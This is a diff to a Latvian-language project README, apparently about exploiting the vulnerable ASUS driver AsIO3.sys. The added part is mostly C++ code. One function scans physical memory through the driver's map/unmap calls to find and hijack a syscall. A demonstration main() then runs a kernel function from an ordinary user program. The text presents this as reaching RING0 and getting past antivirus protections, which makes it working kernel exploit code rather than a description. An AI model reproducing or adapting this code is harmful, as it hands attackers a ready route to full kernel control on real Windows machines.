@@ -149,7 +149,7 @@ __forceinline bool AntiDebug::Interals::CheckWindowClassName()
 ![alt text](https://i.gyazo.com/cae4dbb5f4c00d8174c57325721754ce.png)
 
 ### Vājibas simptomi
-**ZwMapViewOfSection** - Šinī gadījumā tiek izmantos, lai sasaistītu virtuālo atmiņu ar fizikālo atmiņu. (RAM)  
+**ZwMapViewOfSection** - Šinī gadījumā tiek izmantos, lai sasaistītu virtuālo atmiņu ar fizisko atmiņu. (RAM)  
 **ZwUnmapViewOfSection** - Šinī gadījumā tiek izmantos, lai atbrīvotu virtuālo atmiņu.  
 <sub>Bildē aplūkojamas asus drivera (AsIO3.sys) importētās funckijas.</sub>
 ![alt text](https://i.gyazo.com/b9fbd64e3e3e6b4f7b90a2ae3cccf7b7.png)  
@@ -292,6 +292,126 @@ bool asio3_interface::map_syscall()
     return true;
 }
 
+```
+
+Varam arī aplūkot kā strādā **physmeme_map_syscall**, šīs funckija mērķis ir atrast RING0 funckiju fiziskajā atmiņā  
+un izmantojot asio3 driveri ļaut esošajam processam mainīt tā atmiņu.
+
+Aplūkojot kā windows atmiņa tiek strukturēta varam secināt, ka 99% windows datoros atmiņa tiek glabāta blokos, kuru izmēri ir  
+4096 biti vai 2 megabaiti. (Ir iespējams arī 2gb bloks, bet ar tādu nav bijusi saskarsme)
+
+```cpp
+void asio3_interface::physmeme_map_syscall(ULONG64 begin, ULONG64 end)
+{
+    //Use llambda because it's way cleaner
+    auto check_page = [&](asio3_interface* asio3, ULONG64 page) -> bool
+    {
+        if (asio3->syscall_located.load())
+            return true;
+        __try
+        {
+            if (memcmp(reinterpret_cast<PVOID>(page), asio3->syscall_bytes.data(), asio3->syscall_bytes.size()) != 0)
+                return false;
+            //We have found our syscall, perhaps add extra checks to verify it works here
+            asio3->syscall_mapping.store(reinterpret_cast<PVOID>(page));
+            //Verify that the syscall works
+            if (!asio3->verify_syscall())
+                return false;
+
+            asio3->syscall_located.store(true);
+            return true;
+        }
+        __except (EXCEPTION_EXECUTE_HANDLER) 
+        {
+        }
+        return false;
+    };
+
+   
+    constexpr ULONG size_2MB = 0x1000 * 512;
+
+    asio3_interface* asio3 = asio3_interface::get_instance();
+    if (begin + end <= size_2MB)
+    {
+        asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
+        auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(begin + asio3->syscall_page_offset, end, &ioctl_buffer));
+        if (page_va)
+        {
+            for (auto page = page_va; page < page_va + end; page += 0x1000)
+            {
+                if (check_page(asio3, page))
+                    return;
+            }
+            asio3->unmap_phys_memory_x64(&ioctl_buffer);
+        }
+    }
+    else
+    {
+        //Larger than 2MB
+        auto remainder = (begin + end) % (size_2MB);
+        for (auto range = begin; range < begin + end; range += size_2MB)
+        {
+            asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
+            auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(range + asio3->syscall_page_offset, size_2MB, &ioctl_buffer));
+            if (page_va)
+            {
+                for (auto page = page_va; page < page_va + size_2MB; page += 0x1000)
+                {
+                    if (check_page(asio3, page))
+                        return;
+                }
+                asio3->unmap_phys_memory_x64(&ioctl_buffer);
+            }
+        }
+        //Itterate the left over data
+        asio3_info::structures::_IOCTL_MAP_UNMAP_PHYS_MEMORY_X64 ioctl_buffer = { 0 };
+        auto page_va = reinterpret_cast<ULONG64>(asio3->map_phys_memory_x64(begin + end - remainder + asio3->syscall_page_offset, remainder, &ioctl_buffer));
+        if (page_va)
+        {
+            for (auto page = page_va; page < page_va + remainder; page += 0x1000)
+            {
+                if (check_page(asio3, page))
+                    return;
+            }
+            asio3->unmap_phys_memory_x64(&ioctl_buffer);
+        }
+
+    }
+}
+```
+
+### Rezultāts un secinājumi
+Projekts atklāj lielu drošības risku esošajās asus programmās, kuras brīvi apiet esošo anti vīrusu drošības implementācijas.
+Bildē var aplūkot kā no parastas lietotāja programmas, spējam palaist RING0 funckiju **PsGetCurrentProcessId**,  
+kā rezultātā esam nonākuši RING0 līmenī un datora drošība vairs nav limitācīja.
+```cpp
+int main()
+{
+	asio3_interface* vuln_driver = asio3_interface::get_instance();
+
+	if (!vuln_driver->initialize_interface())
+	{
+		printf("Failed initialzing ASIO interface (0x%lX)\n", GetLastError());
+		std::cin.get();
+		return 1;
+	}
+	
+	PVOID _PsGetCurrentProcessId = vuln_driver->get_kernel_export("ntoskrnl.exe", "PsGetCurrentProcessId");
+
+	HANDLE kernel_pid = NULL;
+	vuln_driver->call_function(_PsGetCurrentProcessId, &kernel_pid);//PsGetCurrentProcessId
+
+	printf("PsGetCurrentProcessId : %i\n", kernel_pid);
+	printf("GetCurrentProcessId : %i\n", GetCurrentProcessId());
+
+	printf("Handle opened : 0x%lX\n", vuln_driver->device_handle);
+
+	std::cin.get();
+
+	vuln_driver->on_exit();
+
+	return 1;
+}
 ```
 
 
